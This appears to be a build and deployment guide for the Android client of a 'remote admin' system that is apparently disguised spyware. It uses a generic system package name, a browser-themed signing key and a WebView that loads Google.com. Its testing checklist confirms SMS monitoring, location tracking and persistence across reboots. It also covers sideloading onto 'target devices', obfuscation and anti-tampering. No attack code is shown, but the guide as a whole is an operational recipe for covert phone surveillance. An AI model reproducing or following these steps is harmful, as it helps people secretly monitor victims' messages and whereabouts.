# Android Client Build & Deployment Guide

## Prerequisites
- Android Studio 4.2 or higher
- Java 8 or higher
- Android SDK API 34
- Firebase project setup

## Setup Instructions

### 1. Clone/Download Project
```bash
git clone <repository-url>
cd remote-admin-system/android-client
```

### 2. Firebase Configuration

1. **Download google-services.json**
   - Go to Firebase Console
   - Select your project: `remoteadmin-a1089`
   - Go to Project Settings > General
   - Download `google-services.json`
   - Place in `app/` directory

2. **Verify Package Name**
   - Ensure package name matches: `com.system.service`

### 3. Build Configuration

1. **Open in Android Studio**
   - Open the `android-client` folder in Android Studio
   - Wait for Gradle sync to complete

2. **Update Build Configuration**
   ```gradle
   // In app/build.gradle
   android {
       compileSdk 34
       defaultConfig {
           applicationId "com.system.service"
           minSdk 21
           targetSdk 34
           versionCode 1
           versionName "1.0.0"
       }
   }
   ```

### 4. Signing Configuration

1. **Generate Keystore**
   ```bash
   keytool -genkey -v -keystore browser-release-key.jks -keyalg RSA -keysize 2048 -validity 10000 -alias browser-key
   ```

2. **Configure Signing**
   ```gradle
   // In app/build.gradle
   android {
       signingConfigs {
           release {
               storeFile file('browser-release-key.jks')
               storePassword 'your-keystore-password'
               keyAlias 'browser-key'
               keyPassword 'your-key-password'
           }
       }
       buildTypes {
           release {
               signingConfig signingConfigs.release
               minifyEnabled true
               proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
           }
       }
   }
   ```

### 5. ProGuard Configuration

Create `app/proguard-rules.pro`:
```proguard
# Firebase
-keep class com.google.firebase.** { *; }
-keep class com.google.android.gms.** { *; }

# Keep application classes
-keep class com.system.service.** { *; }

# Keep WebView JavaScript interface
-keepclassmembers class * {
    @android.webkit.JavascriptInterface <methods>;
}
```

## Build Process

### Debug Build
```bash
./gradlew assembleDebug
```

### Release Build
```bash
./gradlew assembleRelease
```

### Install on Device
```bash
./gradlew installDebug
# or
./gradlew installRelease
```

## APK Customization

### 1. App Icon & Name
- Replace icons in `res/mipmap-*` directories
- Update `app_name` in `res/values/strings.xml`

### 2. Permissions Optimization
Remove unused permissions from `AndroidManifest.xml` if not needed:
```xml
<!-- Remove if feature not needed -->
<!-- <uses-permission android:name="android.permission.CAMERA" /> -->
```

### 3. Network Security
Add network security config for HTTPS:
```xml
<!-- In AndroidManifest.xml -->
<application
    android:networkSecurityConfig="@xml/network_security_config">
```

Create `res/xml/network_security_config.xml`:
```xml
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <domain-config cleartextTrafficPermitted="false">
        <domain includeSubdomains="true">yourdomain.com</domain>
    </domain-config>
</network-security-config>
```

## Testing

### 1. Unit Tests
```bash
./gradlew test
```

### 2. Instrumentation Tests
```bash
./gradlew connectedAndroidTest
```

### 3. Manual Testing Checklist
- [ ] App installs successfully
- [ ] Permissions requested on first launch
- [ ] WebView loads Google.com
- [ ] Background service starts
- [ ] Firebase connection established
- [ ] FCM token received
- [ ] Location tracking works
- [ ] SMS monitoring active
- [ ] App survives device reboot

## Distribution

### 1. Google Play Store (Optional)
1. Create developer account
2. Upload APK/AAB
3. Complete store listing
4. Submit for review

### 2. Direct Distribution
1. Enable "Unknown Sources" on target devices
2. Distribute APK file
3. Install manually

### 3. Enterprise Distribution
1. Sign with enterprise certificate
2. Distribute via MDM solution
3. Use enterprise app store

## Security Considerations

### 1. Code Obfuscation
- Enable ProGuard/R8 in release builds
- Use additional obfuscation tools if needed

### 2. Anti-Tampering
```gradle
dependencies {
    implementation 'com.example:anti-tampering:1.0.0'
}
```

### 3. Certificate Pinning
```java
// In network configuration
CertificatePinner certificatePinner = new CertificatePinner.Builder()
    .add("yourdomain.com", "sha256/XXXXXX")
    .build();
```

## Troubleshooting

### Common Issues

1. **Build Fails**
   - Check Android SDK installation
   - Verify Gradle version compatibility
   - Clear build cache: `./gradlew clean`

2. **Firebase Connection Issues**
   - Verify google-services.json is correct
   - Check package name matches
   - Ensure Firebase services are enabled

3. **Permission Issues**
   - Check targetSdk compatibility
   - Test on different Android versions
   - Verify permission requests in code

4. **APK Size Too Large**
   - Enable R8/ProGuard
   - Remove unused resources
   - Use APK splits for different architectures

### Debug Commands
```bash
# Check APK contents
unzip -l app-release.apk

# Analyze APK
./gradlew analyzeDebugBundle

# Check permissions
aapt dump permissions app-release.apk
```

## Automation

### CI/CD Pipeline
```yaml
# .github/workflows/android.yml
name: Android CI
on: [push, pull_request]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
    - uses: actions/checkout@v2
    - name: Set up JDK 8
      uses: actions/setup-java@v2
      with:
        java-version: '8'
        distribution: 'adopt'
    - name: Build with Gradle
      run: ./gradlew build
```

### Automated Testing
```bash
# Run all tests
./gradlew check

# Generate test reports
./gradlew jacocoTestReport
```

## Performance Optimization

1. **Reduce APK Size**
   - Enable code shrinking
   - Remove unused resources
   - Optimize images

2. **Memory Management**
   - Use memory profiler
   - Optimize bitmap loading
   - Prevent memory leaks

3. **Battery Optimization**
   - Use JobScheduler for background tasks
   - Optimize location updates
   - Minimize wake locks

## Deployment Checklist

- [ ] Firebase configuration verified
- [ ] All permissions tested
- [ ] App signing configured
- [ ] ProGuard/R8 enabled
- [ ] Network security configured
- [ ] Testing completed
- [ ] APK signed and verified
- [ ] Distribution method prepared
- [ ] Documentation updated